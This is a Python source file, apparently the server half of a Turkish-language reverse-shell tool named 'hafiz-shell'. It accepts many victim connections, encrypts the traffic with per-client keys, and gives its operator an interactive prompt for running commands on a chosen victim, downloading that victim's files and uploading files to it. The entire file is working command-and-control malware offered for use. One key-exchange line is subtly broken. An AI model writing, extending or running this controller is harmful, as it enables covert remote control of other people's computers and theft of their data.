import socket as s
import threading
from cryptography.fernet import Fernet
import sys
import os
import colorama
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
class hafız_shell():
    def __init__(self):
        self.id = 1
        self.clients = {}
        self.key=b""
    def rsa_encrpt(self,client,key):
        sifreli=client.recv(2048)
        cipher=PKCS1_OAEP.new(sifreli)
        sifreli_key=cipher.encrypt(key)
        client.sendall(sifreli_key)
        
    def baglantı_bekle(self, ip, port):
        try:
            server = s.socket(s.AF_INET, s.SOCK_STREAM)
            server.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
            server.bind((ip, port))
            server.listen(1000)
            while True:
                try:
                    conn, adrr = server.accept()
                    key = Fernet.generate_key()
                    self.rsa_encrpt(conn,key)
            
                    client = [adrr, key, conn]
                    self.clients[self.id] = client
                    sys.stdout.write(colorama.Fore.GREEN+colorama.Style.BRIGHT+f"\r[+] ID:{self.id} bağlantı geldi {adrr}\n+{colorama.Fore.RED+colorama.Style.BRIGHT}hafiz-shell>")
                    sys.stdout.flush()
                    self.id += 1
                except Exception:
                    pass
        except Exception as e:
            print(str(e))

    def dosya_al(self, id, cmd):
        try:
            addr, key, conn = self.clients[id]
            fer = Fernet(key)
            
            remote_path = cmd[9:].strip()
            filename = remote_path.replace("\\", "/").split("/")[-1]
            if not filename: filename = "indirilen_dosya"

            raw_header = conn.recv(10).decode("utf-8").strip()
            if not raw_header or raw_header == "ERROR":
                print("[!] İstemci tarafında dosya hatası.")
                return
                
            total_size = int(raw_header)
            print(f"[*] {filename} indiriliyor... ({total_size} byte)")

            encrypted_data = b""
            while len(encrypted_data) < total_size:
                chunk = conn.recv(min(4096, total_size - len(encrypted_data)))
                if not chunk: break
                encrypted_data += chunk

            with open(filename, "wb") as f:
                f.write(fer.decrypt(encrypted_data))
                
            print(f"[+] Dosya başarıyla kaydedildi: {filename}")
            
        except Exception as e:
            print(f"[!] Dosya alma hatası: {e}")
    def dosya_gonder(self, id, cmd):
        try:
            addr, key, conn = self.clients[id]
            fer = Fernet(key)
            
            local_path = cmd[7:].strip()
            if not os.path.exists(local_path):
                print(f"[!] Yerel dosya bulunamadı: {local_path}")
                conn.sendall(b"ERROR     ") 
                return

            with open(local_path, "rb") as f:
                sifreli_veri = fer.encrypt(f.read())
            
            header = str(len(sifreli_veri)).zfill(10).encode("utf-8")
            conn.sendall(header)
            conn.sendall(sifreli_veri)
            print(f"[+] {local_path} başarıyla gönderildi.")
            
        except Exception as e:
            print(f"[!] Dosya gönderme hatası: {e}")

    def main(self, ip, port):
        t1 = threading.Thread(target=self.baglantı_bekle, args=(ip, port), daemon=True)
        t1.start()
        print(colorama.Fore.RED+colorama.Style.BRIGHT+"""
 ██░ ██  ▄▄▄        █████▒██▓▒███████▒     ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▒████▄    ▓██   ▒▓██▒▒ ▒ ▒ ▄▀░   ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒██  ▀█▄  ▒████ ░▒██▒░ ▒ ▄▀▒░    ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ░██▄▄▄▄██ ░▓█▒  ░░██░  ▄▀▒   ░     ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓ ▓█   ▓██▒░▒█░   ░██░▒███████▒   ▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░   ░▓  ░▒▒ ▓░▒░▒   ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░  ▒   ▒▒ ░ ░      ▒ ░░░▒ ▒ ░ ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░  ░   ▒    ░ ░    ▒ ░░ ░ ░ ░ ░   ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░      ░  ░        ░    ░ ░             ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                             ░                                                     
              """)
        print(colorama.Fore.CYAN+colorama.Style.BRIGHT+f"server basladı {ip}:{port}")
        try:
            while True:
                komut = input(colorama.Fore.RED+colorama.Style.BRIGHT+"hafiz-shell>"+colorama.Fore.YELLOW)
                if komut == "list":
                    if not self.clients:
                        print("Henüz bağlantı yok.")
                    for cid, bilgi in self.clients.items():
                        print(f"id  {cid} {bilgi[0]}")
                
                if komut.startswith("use"):
                    try:
                        target_id = int(komut.split(" ")[1])
                        if target_id in self.clients:
                            client_bilgi = self.clients[target_id]
                            hedef = client_bilgi[2]
                            fer = Fernet(client_bilgi[1])
                            
                            while True:
                                cmd = input(colorama.Fore.RED+colorama.Style.BRIGHT+f"hafiz-shell({target_id})>"+colorama.Fore.YELLOW)
                                if cmd == "exit": break 
                                if not cmd: continue
                                
                                try:
                                    hedef.sendall(fer.encrypt(cmd.encode("utf-8")))

                                    if cmd.startswith("download "):
                                        self.dosya_al(target_id, cmd)
                                        continue

                                    if cmd.startswith("upload "):
                                        self.dosya_gonder(target_id, cmd)
                                        continue

                                    gelenveri = hedef.recv(16498)
                                    if not gelenveri: 
                                        print(f"\n[!] ID:{target_id} bağlantıyı kapattı.")
                                        self.clients.pop(target_id, None)
                                        break
                                        
                                    print(fer.decrypt(gelenveri).decode("utf-8"))
                                except Exception as e:
                                    print(f"\n[!] İletişim hatası: {e}")
                                    self.clients.pop(target_id, None)
                                    break
                    except:
                        print("[!] Hatalı ID veya kullanım.")
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Kullanım: python server.py <ip> <port>")
    else:
        server = hafız_shell()
        server.main(sys.argv[1], int(sys.argv[2]))
